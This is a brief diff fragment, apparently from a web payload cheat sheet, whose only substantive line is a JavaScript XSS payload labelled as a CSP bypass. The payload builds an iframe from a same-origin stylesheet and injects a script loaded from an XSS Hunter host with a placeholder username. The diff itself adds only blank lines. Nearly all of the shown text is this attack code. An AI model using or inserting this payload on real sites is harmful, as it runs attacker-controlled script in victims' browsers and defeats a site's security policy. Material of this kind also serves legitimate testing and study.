@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:21:38.853251+00:00'
 // CSP Bypass with Inline and Eval
 d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
 ```
+
+
